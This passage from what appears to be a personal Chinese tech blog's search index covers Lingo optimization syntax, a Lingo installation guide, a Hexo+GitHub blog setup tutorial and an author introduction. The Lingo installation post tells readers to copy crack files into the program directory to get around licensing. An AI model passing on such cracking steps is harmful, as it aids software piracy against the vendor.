x(i,j)) &lt;= a(i));@for(demand(j): @sum(supply(i): x(i,j)) = b(j)); 求解结果运行如上所示Lingo程序，我们可以得到如下结果： 通过上图展示，我们可以得到运输的最佳方案以及最小运费161个单位。运输方案图示如下： 待续","path":"2018/09/14/Lingo解决优化问题/"},{"title":"Lingo基本操作","text":"前言Lingo是一门主要求解非线性规划数学模型的编程软件，记得最初接触Lingo是在阅读《数学建模教程》一书，该书在第五章主要讲解使用Lingo来解决优化问题，也是在那个时候认识到了Lingo的强大之处。Lingo的使用就好比解决一道简单的数学问题，而你只需要使用Lingo支持的编程规范给其提供充足的已知条件即可，之后会自动使用相关算法为您解答。为了日后更加方便的查询Lingo相关知识，所以将Lingo的基本使用在此记录。 关于Lingo的下载及安装问题鄙人已做整理，可参考本篇教程 Lingo安装 Lingo基本运算符算术运算符^：乘方*：乘/：除+：加-：减 逻辑运算符在Lingo中，逻辑运算符主要用于集循环函数的条件表达式中，来控制在函数中哪些集成员被包含，哪些被排斥。 符号 说明 #and# 且，&amp; #or# 或，\\ \\ #not# 非，! #eq# 等于，== #ne# 不等于，!= #gt# 大于，&gt; #ge# 大于等于，&gt;= #lt# 小于，&lt; #le# 小于等于，&lt;= 关系运算符= 、&lt;= 、 &gt;= 函数标准数学函数 函数 说明 @abs(x) 绝对值 @sin(x) 正弦值，采用弧度制 @cos(x) 余弦值 @tan(x) 正切 @exp(x) 指数，$e^x$ @log(x) 自然对数 @lgm(x) gamma函数的自然对数 @sign(x) x&lt;0返回-1，否则返回返回1 @floor(x) 取整 @smax($x_1,x_2,\\cdots,x_n$) 取($x_1,x_2,\\cdots,x_n$) 中的最大值 @smin($x_1,x_2,\\cdots,x_n$) 取($x_1,x_2,\\cdots,x_n$) 中的最小值 集循环函数集循环函数用于遍历整个集，其基本语法如下： 12@function(setname[(set_index_list)[|conditional_qualifier]]:expression_list); @function相应于下面罗列的四个集循环函数之一；setname是要遍历的集；set_ index_list是集索引列表；conditional_qualifier是用来限制集循环函数的范围，当集循环函数遍历集的每个成员时，LINGO都要对conditional_qualifier进行评价，若结果为真，则对该成员执行@function操作，否则跳过，继续执行下一次循环。expression_list是被应用到每个集成员的表达式列表，当用的是@for函数时，expression_list可以包含多个表达式，其间用逗号隔开。这些表达式将被作为约束加到模型中。当使用其余的三个集循环函数时，expression_list只能有一个表达式。如果省略set_index_list，那么在expression_list中引用的所有属性的类型都是setname集。 @for@for函数用来对集中的成员形成约束。 例：产生序列[1,4,9,16,25] 12345sets:nums/1..5/: x;endsets@for(nums(i): x(i)=i^2); @sum@sum函数返回遍历指定集成员的一个表达式的和 例：求[1,2,3,4,5,6,7]中前五个数的和 1234567sets:nums/1..7/: x;endsets@for(nums(i): x(i)=i);s = @sum(nums(i) | i #le# 5: x(i)); @max，@min这两个函数分别用于返回指定集成员的一个表达式的最大值和最小值 例：求[1,2,3,4,5,6,7,8,9,10]中前五个数的最大值，后五个数的最小值 12345678sets:nums/1..10/: x;endsets@for(nums(i): x(i)=i);min_value = @max(nums(i) | i #le# 5: x);max_value = @min(nums(i) | i #ge# 6: x); 变量界定函数该函数主要是对决策变量做附加限制，一般用于@for函数中，主要有如下四种： 函数 说明 @bin(x) 限制x为0或1 @bnd(a,x,b) 限制x取a到b之间的值 @free(x) x取实数 @gin(x) x取整数 说明 Lingo中还有其他大量的函数，比如金融函数、概率函数、变量界定函数，由于目前鄙人暂时用不上，所以就暂且不记录了，待需要时再做进一步更新。 待更新","path":"2018/09/14/Lingo基本操作/"},{"title":"Lingo安装","text":"Lingo简介&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;LINGO是Linear Interactive and General Optimizer的缩写，即“交互式的线性和通用优化求解器”，由美国LINDO系统公司（Lindo System Inc.）推出的，可以用于求解非线性规划，也可以用于一些线性和非线性方程组的求解等，功能十分强大，是求解优化模型的最佳选择。其特色在于内置建模语言，提供十几个内部函数，可以允许决策变量是整数（即整数规划，包括 0-1 整数规划），方便灵活，而且执行速度非常快。能方便与EXCEL，数据库等其他软件交换数据。 Lingo安装 Lingo下载地址：点击我&nbsp;&nbsp;&nbsp;&nbsp;密码：r6cy 下载到本地并解压后可见以下文件 双击运行LINGO-WINDOWS-IA32-12.0.exe可执行文件 单击Next 单击I accept 并Next 更改安装目录，Next 点击Only For Me，出现后续窗口点击OK 取消Launch，并Finish 打开“lingo12破解文件”并复制所有文件粘贴至Lingo所在目录 安装完成 安装声明&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;提供的安装文件皆来自网络共享资源，若想更好的体验请支持正版,Lingo官网下载地址:点击我。如内容有侵犯您的版权或利益的请联系QQ：26647879,WX：LT510087153，鄙人见后会在第一时间进行处理。","path":"2018/09/13/Lingo安装/"},{"title":"Hexo+Github建站","text":"前言gitHub是一个面向开源及私有软件项目的托管平台，也是版本控制库因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。此后，2018年6月4日，微软宣布，通过75亿美元的股票交易收购代码托管平台GitHub。Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 官网：Github：https://github.com/Hexo：https://hexo.io/zh-cn/docs/ 以上摘自官方解释 作为一位Coder，一直想找个安静的地方沉淀一下自己，记录自己学习的过程并分享所走过的坑。网上也有各种各样的建站方法，例如WordPress、emlog、Typecho等等平台。但是绝大多数的平台的使用都避免不了备案等一系列的困扰，对于懒癌患者来说无疑是一大痛病，通过海量信息的层层筛选，鄙人最终发现Hexo+Github能够很好的满足大多数人的要求，既简单又美观，使用它来搭建属于自己的个人博客再好不过了。如果你有也有建站的想法的话，那么以下内容将记录了我搭建过程所走的坑，或许能够帮助到你，久而久之，你还会发现其中还有很多有意思的美化操作。 以下的搭建过程是针对小白所实现的，例如github仓库的创建、环境变量的配置、git终端等一些基础操作都有较为详细的说明。由于鄙人语言功底不行，如果有拗口、错别字、歧义或者不解的地方可在文章末端或右方的Gitalk留言，博主看到会第一时间解释，在此谢过。 一、搭建环境环境介绍： windows系统。系统根据自己的需要准备即可，mac、linux皆可，本文以windows系统环境下搭建为例。 git。安装之后方便使用各种命令，还能够更好的clone github仓库。 node.js。一个Javascript运行环境，网站的搭建必须建立在这个框架之上。 Hexo。使用命令可以直接将Hexo生成的静态资源存储到Github上，然后使用自己的github账户即可访问。 安装：Git的安装：你可在git官网中根据自己的需要进行下载：https://git-scm.com/。打开之后你将看到如下内容： 将其下载到指定的磁盘，然后傻瓜式安装即可。安装好后打开cmd终端，执行git --version，若出现git version 2.19.2.windows.1之类的输出则说明已经成功安装。 node.js的安装：node.js的安装和Git的安装如出一辙，同样的操作下载node.js并安装即可，安装好后我们在cmd终端使用node -v命令，如出现v10.13.0类似输出，则说明已经成功安装。node.js下载：https://nodejs.org/en/ github注册进入github的注册页面：https://github.com/ 然后根据流程填写相应的信息即可。 二、博客搭建创建仓库并部署注册了github之后，我们需要创建一个仓库来存储我们的网站源码，创建的仓库名也就是我们博客访问的url地址，该url是采用子域名的方式，其一般形式为：1XXX.github.io 上面的XXX一般代表着你注册时的github用户名，所以在你注册之后该仓库名一般是固定的，仓库的创建及部署流程如下： 进入个人github主页之后点击New repository来创建仓库，如下： 之后按照如下内容进行创建 完成以上操作之后，你就已经成功创建好了自己的仓库。这时我们需要利用git命令来生成秘钥。鼠标右键桌面选择git bash here，然后在git终端执行以下命令：1ssh-keygen -t rsa -C XXX@XXX.com 其中XXX@XXX.com指的是你注册github时候使用的邮箱，在命令执行的时候回有一些yes、no的选择，直接默认回车即可，最终你将会看到类似如下内容：1234Your identification has been saved in /c/Users/you/.ssh/id_rsa.Your public key has been saved in /c/Users/you/.ssh/id_rsa.pub.The key fingerprint is:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx:xx your_email@example.com 之后你将在c/Users/you/.ssh/id_rsa.pub路径文件看到生成的秘钥对，这个文件我们暂且打开，之后复制粘贴会用到。 补充：打开git bash here之后我们首先需要配置一下个人信息，在git终端分别配置自己的用户名和邮箱。命令如下：12git config --global user.name XXX # XXX表示你github注册时的用户名git config --global user.email XXX # XXX表示你github注册时的邮箱 之后我们需要将ssh key添加到我们的github账户。在个人github主页找到settings，然后点击SSH and GPG keys，之后再出现的页面的中点击New SSH key，随后根据如下图操作进行添加ssh key： 打开git bash here，执行ssh -T git@github.com，之后会出现一系列的问题，我们只需要回答yes即可，最终会输出如下类似内容： 1Hi username! You've successfully authenticated OK，完成以上流程后，你的本机就可以连接github了。 Hexo博客框架的搭建在完成以上操作后，我们就可以来使用Hexo了，你可通过如下操作来进行。 在以上操作的基础上，我们首先安装一下hexo。根据自己的需要在磁盘中创建一个名为Hexo文件夹，为了更好的管理文件，鄙人是在E盘的根目录中创建改文件夹的。之后进入该文件并在当前路径下打开git bash here，依次运行如下命令来进行创建：12npm install hexo-cli -gnpm install hexo --save 执行完成之后，你会发现在该目录之下会有个node_modules文件夹生成，如此一来，你就已经安装好了Hexo，离终点又近了一点 (*￣rǒ￣) 以上的node_modules文件生成之后，我们需要配置一下Hexo的环境变量，以便在cmd中可以直接执行后续博客操作的命令。进入到node_module文件夹下的bin目录，然后复制该bin目录的路径，如下： 后面的添加环境变量的操作比较简单，所以就描述一些流程，就不贴图了。如果有遇到问题的可联系鄙人。后续操作描述如下：1. ctrl+D切换到桌面。2. 右键此电脑，打开属性。3. 点击左侧的高级系统设置。 4. 点击环境变量。5. 在用户变量或者系统变量中找到Path并双击它（推荐更改用户变量）6. 双击之后点击新建，然后将以上的复制的bin目录粘贴至此。6. 然后一步一步的确定、确定、确定。OK，完成了，是不是很简单 (*￣rǒ￣)。 在以上操作完成之后，win+r，打开cmd终端，然后执行Hexo -v，若出现如下类似信息，则说明你的Hexo已经成功配置环境变量。 随后，我们需要创建我们的博客站点的主目录，你可使用我推荐的方式进行创建，当然你也可以根据自己的喜好方式进行创建。首先在E盘的根目录下创建ZerosBlog文件夹（自定义），然后进入该文件夹并创建XXX.github.io文件夹（该文件夹名必须与你之前创建的github仓库名一致，固定），进入到该目录右键点击git bash here来打开git终端，之后在该终端下根据如下命令一步步进行操作： 初始化hexo：1hexo init 自动安装网站所需组件：1npm install OK，至此，你已经基本完成了网站的建设，可以说是万事具备，只欠东风了。一个基本的Hexo博客框架已经完成了，我们需要导入自己的喜欢的主题即可正常使用了，主题的引入操作如下。 三、主题引入Hexo中有很多很多很多的主题（一个、两个、三个。。。 Σ( ° △ °|||)︴ 好吧，我不知道有多少个，因为他会被许多的大神更新着，如果好奇的话自行了解即可），其主题官网为：https://hexo.io/themes/，你可以在此观摩并使用任意一个来作为你博客的主题，但据统计，绝大多数使用hexo+github来搭建博客的都是使用NexT，它的“精于心，简于形”的简单美受到了许多人的青睐，所以以下将以NexT为例来作为我们主题的引入，当然，你也可以去阅读NexT的主题文档。 在Hexo主题页面ctrl+F并输入next查找到NexT主题，然后点击进入到NexT主题的github页面，该页面存储了NexT主题的源码，我们需要将其下载下来为己所用。在前面我们已经提到了git的最为方便之处就是可以随意clone github的资源，在这个操作就可以显露出来了 ┗|｀O′|┛ 嗷~~ ┗|｀O′|┛ 嗷~~ ┗|｀O′|┛ 嗷~~。 根据如下图所示复制出该主题的仓库链接： 复制好该链接后我们进入E:\\ZerosBlog\\XXX.github.io\\themes文件夹下，右键点击git bash here进入git终端，并执行如下命令，其中链接为你上一步所复制的内容1git clone https://github.com/theme-next/hexo-theme-next.git 如果你累了的话可以喝口茶，稍等片刻之后就会在该目录之下成功下载NexT主题了。 下载NexT主题后，我们需要配置来达到使用该主题的目的，该配置文件是属于站点的，其路径为E:\\ZerosBlog\\XXX.github.io\\_config.yml，我们用文本编辑器（notepad、notepad++、sublime text、Vim……）打开它，然后ctrl+f输入theme查找到theme属性，然后将值改为next，如下所示： 在NexT中已经为我们准备了四种博客样式，其配置文件在主题的配置文件中，即E\\ZerosBlog\\XXX.github.io\\themes\\next\\_config.yml文件，我们用文本编辑器（notepad、notepad++、sublime text、Vim……）打开它，然后ctrl+F输入scheme查找到如下内容：可以看见总共有四种主题Muse、Mist、Pisces、Gemini，你可以根据自己的喜好选择其中一种，然后将其他三种注释即可，ctrl+s保存然后退出 随后我们来到站点的根目录下，即E:\\ZerosBlog\\XXX.github.io，打开git终端，完成如下三步走命令 123hexo clean # 清除缓存heo g # 生成静态资源hexo d # 部署至github 在以上命令执行过程中，可能会遇到一个登陆表单的突然出现，我们只需要根据自己github注册时所填的信息进行登陆即可，命令执行完成之后我们的站点已经完成了部署并请求https://XXX.github.io/即可访问到自己的网站了，如下图所示： 四、总结以上的搭建过程是针对小白所实现的，例如github仓库的创建、环境变量的配置、git终端等一些基础操作都有较为详细的说明。由于鄙人语言功底不行，如果有拗口、错别字、歧义或者不解的地方可在文章末端或右方的Gitalk留言，博主看到会第一时间解释，在此谢过。 至此，已经完成了博客的搭建，但是我们左看看、右看看，不管怎么看都似乎显得有点单调，在之后将会介绍Hexo的基本命令和博客的美化，可以引入一些插件，比如像Gitalk在线聊天、APlayer、字数统计等一些插件。 OK，结束了。 2018-09-10,By Zero","path":"2018/09/10/Hexo-Github建站/"},{"title":"Begin","text":"关于本站既然这是本站的第一篇博文，首先得说下这个博客搭建的初衷： 好记性不如烂笔头，何况我根本没有好记性。记忆力这种东西就像内存，你渴望接受的东西越多需要记忆的量也就越大，所以会频繁性的造成遗忘之前所学所想的现象。当你某一天需要的时候，可能又会支付较大的时间成本才能再次捡起。所以希望能在本站记录一些自己的学习过程，以便日后的再次回顾。 记得在自己学习的时候，总会出现各种各样的玄学bug，而此时首先想到的就是去biadu、google、Stack Overflow等一些知名网站去寻找解决方法。然而令人崩溃的是这些解答大同小异，使用之后依然不能解决问题，原本一个小小的问题却需要花费大量的时间。所以希望来访的朋友都能够有所收获，在较短的时间内解决看起来不是问题的问题。 感觉拥有一个自己的个人博客很Cool，能够在这“为所欲为、畅所欲言”，而不像csdn、博客园那样的有所拘束。 可以说博主的语文那是相当差劲了，高考六七十分的选手（我也不知道为什么，考完之后明明感觉还行的），说多了都是泪啊 (ノへ￣、)。所以想在这个博客里锻炼一下自己的语言组织能力。 基于以上几点，所以就有了建站的想法。虽然之前花了将近20天使用Django、ssm后端框架 + 前端 + 各种插件来搭建过博客，但是为了避免备案、维护等困扰，所以最终选择了成熟的Hexo来实现。经过两天的坚持，最终本站才初见成色。 本站历程： 2018-09-05 使用Hexo+Next成功搭建个人博客系统的基本功能 (￣_,￣ ) 2018-09-10 添加鼠标点击出现爱心效果 o(*≧▽≦)ツ┏━┓ 2018-09-27 成功引入DaoVoice网页在线联系功能 ╰(°▽°)╯ 2018-10-10 在本站右下角添加Aplayer音乐系统 (ˉ▽￣～) 切~~ 关于我鄙人是江西上饶的一位无名小卒，现于上海本科就读，现实生活中比较内向、形单影只，但热衷于各种技术，目前正朝着极客的方向努力。至于未来发展的如何，一切都只是未知数，总而言之，言而总之，希望自己能够在这条道路上坚持下去。个人爱好： 动漫、code、音乐、乒乓球、棋牌 拿句最近看到的笑语来介绍下： 本人擅长Ai、Fw、Fl、Br、 Ae、Pr、Id、Ps等软件的安装与卸载，精通 CSS、JavaScript、PHP、ASP、C、C＋＋、 C#、Java、Ruby、Perl、Lisp、python、 Objective-C、ActionScript、Pascal等单词拼 写，熟悉Windows、Linux、Mac、 Android、IOS、WP8等系统的开关机……求一份设计相关的工作本人擅长Ai、Fw、Ps等软件的安装与卸载的工作 欢迎互加友链，可在文末留言，格式如下： Contcat me： Email：26647978@qq.com QQ：26647879 VX：LT510087153 右方的DaoVoice在线联系 文末的Gitalk留言 友链添加最后，欢迎各位大佬互加友链，可在下方留言，友链互加事项及方式如下： 事项： 贵站需要保持一定的活跃度 贵站必须有10篇以上原创文章 贵站不在更新请及时联系本站 方式： 贵站将本站添加至友链后，可在下方Gital留言，附上贵站的链接及文章主要分享类别。","path":"2018/09/08/Begin/"}]}